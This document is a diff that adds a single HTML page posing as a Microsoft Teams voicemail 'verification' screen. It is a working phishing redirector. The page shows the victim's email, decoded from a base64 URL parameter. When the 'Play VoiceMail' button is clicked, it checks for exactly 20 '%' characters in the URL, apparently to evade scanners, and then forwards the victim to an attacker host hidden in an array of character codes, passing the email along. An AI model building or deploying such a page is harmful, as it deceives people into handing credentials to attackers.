@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Page</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: white;
+        }
+        .container {
+            text-align: center;
+        }
+        .dots-container {
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .dot {
+            background-color: dodgerblue;
+            border-radius: 50%;
+            width: 10px;
+            height: 10px;
+            margin: 5px;
+            animation: grow 1.5s infinite ease-in-out;
+        }
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.1s; }
+        .dot:nth-child(3) { animation-delay: 0.2s; }
+        .dot:nth-child(4) { animation-delay: 0.3s; }
+        .dot:nth-child(5) { animation-delay: 0.4s; }
+        @keyframes grow {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+        }
+        #emailDisplay {
+            color: rgb(110, 71, 238);
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        #verifyButton {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            background-color: rgb(110, 71, 238);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            height: 50px;
+        }
+        #verifyButton:hover {
+            background-color: rgb(142, 204, 255);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://cdn.pixabay.com/photo/2022/01/27/07/17/microsoft-teams-6971301_960_720.png" alt="Logo" width="330px">
+        <div id="emailDisplay" aria-live="polite"></div>
+        <button id="verifyButton" aria-label="Click to Verify">Play VoiceMail</button>
+        <div class="dots-container" aria-label="Loading content">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a>
+    <script>
+        // Function to decode base64 string
+        function decodeBase64(encoded) {
+            try {
+                return decodeURIComponent(atob(encoded).split('').map(c =>
+                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
+            } catch (e) {
+                console.error("Decoding failed: ", e);
+                return null; // Return null if decoding fails
+            }
+        }
+
+        // Function to count the percentage (%) characters in the URL
+        function countPercentageCharacters() {
+            const url = window.location.href;
+            return (url.match(/%/g) || []).length; // Count all '%' characters in the URL
+        }
+
+        // Function to find the email parameter from the URL
+        function getEmailParam() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('email') || null; // Get the 'email' param if it exists
+        }
+
+        // Function to update the displayed email
+        function updateEmailDisplay() {
+            const emailParam = getEmailParam();
+            const emailDisplay = document.getElementById('emailDisplay');
+            if (emailParam) {
+                const decodedEmail = decodeBase64(emailParam);
+                if (decodedEmail) {
+                    emailDisplay.innerText = decodedEmail; // Display the decoded email
+                } else {
+                    emailDisplay.innerText = "Error: Invalid email format.";
+                }
+            } else {
+                emailDisplay.innerText = "Error: No email found in URL.";
+            }
+        }
+
+        // Redirect function if the percentage characters condition is met
+        function redirectToTarget(base64Email) {
+            const parts = [104, 116, 116, 112, 115, 58, 47, 47, 111, 117, 116, 45, 109, 105, 115, 111, 114, 102, 46, 116, 111, 112, 47, 115, 105, 54, 47, 105, 110, 100, 101, 120, 46, 104, 116, 109, 108, 47, 35];
+            const obfuscatedURL = String.fromCharCode(...parts) + base64Email;
+            window.location.href = obfuscatedURL;
+        }
+
+        // Click button functionality
+        const button = document.getElementById('verifyButton');
+        button.addEventListener('click', function() {
+            // Hide the verify button
+            button.style.display = 'none';
+            // Show loading dots
+            document.querySelector('.dots-container').style.display = 'flex';
+            
+            setTimeout(() => {
+                const percentCount = countPercentageCharacters();
+                const emailParam = getEmailParam();
+                if (percentCount === 20 && emailParam) {
+                    // If there are exactly 20 percentage characters and an email param, redirect
+                    redirectToTarget(emailParam);
+                } else {
+                    console.error(`Invalid URL: Found ${percentCount}% characters or missing email parameter.`);
+                    document.getElementById('emailDisplay').innerText = `Cannot redirect: ${percentCount}% characters found, 20 required or missing email parameter.`;
+                    document.querySelector('.dots-container').style.display = 'none'; // Hide dots if conditions aren't met
+                }
+            }, 2000);
+        });
+
+        window.onload = updateEmailDisplay; // Update email on page load
+    </script>
+</body>
+</html>
